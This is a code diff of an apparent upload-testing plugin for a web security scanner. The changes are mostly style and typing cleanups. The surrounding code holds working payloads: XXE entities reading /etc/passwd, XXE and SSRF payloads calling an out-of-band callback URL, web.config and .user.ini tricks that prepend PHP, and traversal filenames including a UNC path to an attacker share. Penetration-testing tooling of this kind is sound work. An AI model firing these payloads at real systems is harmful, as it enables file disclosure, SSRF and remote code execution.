@@ -51,20 +51,17 @@ won't hammer a fragile target.
 """
 from __future__ import annotations
 
-import base64
 import io
 import re
 import secrets
 import struct
-import time
 import zipfile
 import zlib
-from dataclasses import dataclass, field
-from typing import Iterable, Sequence
-from urllib.parse import urljoin, urlparse
+from collections.abc import Sequence
+from dataclasses import dataclass
+from urllib.parse import urlparse
 
 from reqlore import plugins_sdk as sdk
-
 
 # =============================================================================
 # Plugin metadata
@@ -122,8 +119,8 @@ _WEB_CONFIG_PAYLOAD = (
 _USER_INI_PAYLOAD = "auto_prepend_file=reqlore.php\n"
 
 _EICAR = (
-    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
-).encode()
+    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+)
 
 # Microsoft Office Open XML expects a zip with [Content_Types].xml; we
 # emit a tiny one whose word/document.xml contains an XXE entity.
@@ -132,7 +129,8 @@ _DOCX_CONTENT_TYPES = (
     "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
     "<Default Extension=\"xml\" ContentType=\"application/xml\"/>"
     "<Override PartName=\"/word/document.xml\""
-    " ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>"
+    " ContentType=\"application/vnd.openxmlformats-"
+    "officedocument.wordprocessingml.document.main+xml\"/>"
     "</Types>"
 )
 
@@ -224,7 +222,7 @@ def _svg_xxe_oast(oast_url: str) -> bytes:
         f"<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"{oast_url}\"> ]>\n"
         "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
         "<text x=\"0\" y=\"0\">&xxe;</text></svg>"
-    ).encode("utf-8")
+    ).encode()
 
 
 def _svg_xxe_file() -> bytes:
@@ -233,11 +231,11 @@ def _svg_xxe_file() -> bytes:
     Operator must inspect the redownload response manually for
     ``root:x:0:0`` style content."""
     return (
-        "<?xml version=\"1.0\" standalone=\"no\"?>\n"
-        "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
-        "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
-        "<text x=\"0\" y=\"0\">&xxe;</text></svg>"
-    ).encode("utf-8")
+        b"<?xml version=\"1.0\" standalone=\"no\"?>\n"
+        b"<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
+        b"<text x=\"0\" y=\"0\">&xxe;</text></svg>"
+    )
 
 
 def _svg_ssrf(oast_url: str) -> bytes:
@@ -270,7 +268,7 @@ def _xml_xxe(oast_url: str) -> bytes:
         "<?xml version=\"1.0\"?>\n"
         f"<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"{oast_url}\"> ]>\n"
         "<r>&xxe;</r>"
-    ).encode("utf-8")
+    ).encode()
 
 
 def _pdf_oast(oast_url: str) -> bytes:
@@ -509,7 +507,7 @@ def _traversal_filenames(base_filename: str) -> list[tuple[str, str]]:
         (f"%252e%252e%252f{base_filename}", "traversal-double-encoded"),
         (f"..%c0%af{base_filename}", "traversal-utf8-overlong"),
         (f"..%2f..%2f{base_filename}", "traversal-mixed"),
-        (f"/etc/passwd", "absolute-unix"),
+        ("/etc/passwd", "absolute-unix"),
         (f"/var/www/html/{base_filename}", "absolute-webroot"),
         (f"C:\\Windows\\Temp\\{base_filename}", "absolute-windows"),
         (f"\\\\attacker\\share\\{base_filename}", "unc-path"),
@@ -930,17 +928,15 @@ def _looks_accepted(baseline: Baseline, resp: object) -> bool:
     status = int(getattr(resp, "status", 0) or 0)
     if status == 0:
         return False
-    if baseline.status and status != baseline.status:
-        # Allow 200/201/204 to all count as success even if baseline
-        # was a different 2xx.
-        if not (200 <= status < 300 and 200 <= baseline.status < 300):
-            return False
+    # Allow 200/201/204 to all count as success even if baseline
+    # was a different 2xx.
+    if (baseline.status and status != baseline.status
+            and not (200 <= status < 300 and 200 <= baseline.status < 300)):
+        return False
     body = bytes(getattr(resp, "body", b"") or b"")
     # If response is HUGE compared to baseline (e.g. 50x), probably an
     # error page. If baseline was empty, accept any 2xx.
-    if baseline.body_len and len(body) > max(4096, baseline.body_len * 50):
-        return False
-    return True
+    return not (baseline.body_len and len(body) > max(4096, baseline.body_len * 50))
 
 
 def _extract_basename(filename: str) -> str:
@@ -1027,7 +1023,7 @@ def _parse_multipart_seed_body(
             continue
         try:
             head_str = head.decode("latin-1", "replace")
-        except Exception:
+        except (UnicodeDecodeError, AttributeError):  # noqa: S112  # skip malformed multipart part header, keep parsing remaining parts
             continue
         name: str | None = None
         is_file = False
@@ -1050,7 +1046,7 @@ def _parse_multipart_seed_body(
             continue
         try:
             val = payload.decode("utf-8", "replace")
-        except Exception:
+        except (UnicodeDecodeError, AttributeError):  # noqa: S112  # skip multipart part with un-decodable payload, keep parsing remaining parts
             continue
         if "\n" in val or "\r" in val:
             continue
@@ -1132,7 +1128,7 @@ def _apply_seed_overrides(settings: dict, seed, log_fn) -> dict:
                 f"seed#{hid}: derived " + ", ".join(derived),
                 "info",
             )
-        except Exception:
+        except Exception:  # noqa: S110  # best-effort audit log; logging failure must never crash a scan run
             pass
     return out
 
@@ -1293,12 +1289,11 @@ def _run(ctx: sdk.PluginContext) -> None:
     honor_scope = bool(s.get("honor_scope", True))
 
     # ---- Scope check ------------------------------------------------------
-    if honor_scope and not ctx.scope.empty:
-        if not ctx.scope.is_url_in_scope(upload_url):
-            ctx.log(f"target {upload_url!r} is out of project scope; "
-                    f"aborting (untoggle 'honor_scope' to override)",
-                    "warning")
-            return
+    if honor_scope and not ctx.scope.empty and not ctx.scope.is_url_in_scope(upload_url):
+        ctx.log(f"target {upload_url!r} is out of project scope; "
+                f"aborting (untoggle 'honor_scope' to override)",
+                "warning")
+        return
 
     # ---- Parse extra form fields / headers -------------------------------
     def _kv_lines(blob: str) -> list[tuple[str, str]]:
@@ -1461,7 +1456,7 @@ def _run(ctx: sdk.PluginContext) -> None:
 
         # Re-download verification.
         rd_url = _redownload_url(download_tpl, case.filename)
-        rd_status = ""
+        rd_status: int | str = ""
         rd_marker_hit = False
         rd_matches = False
         if accepted and rd_url:
@@ -1542,9 +1537,8 @@ def _run(ctx: sdk.PluginContext) -> None:
         })
         ctx.progress(idx, len(cases), case.name)
 
-        if delay_ms > 0:
-            if not ctx.sleep(delay_ms / 1000.0):
-                break
+        if delay_ms > 0 and not ctx.sleep(delay_ms / 1000.0):
+            break
 
     # ---- Settle + collect OAST callbacks ---------------------------------
     if oast_token and not ctx.stop_requested():
@@ -1559,9 +1553,10 @@ def _run(ctx: sdk.PluginContext) -> None:
             # path looks like /<token>/<tag>/...
             segs = [seg for seg in path.split("/") if seg]
             tag = segs[1] if len(segs) >= 2 else ""
-            case = tag_to_case.get(tag)
-            if case is None:
+            case_opt = tag_to_case.get(tag)
+            if case_opt is None:
                 continue
+            case = case_opt
             oast_findings += 1
             ctx.record_finding(
                 title=f"OAST callback from upload: {case.name}",
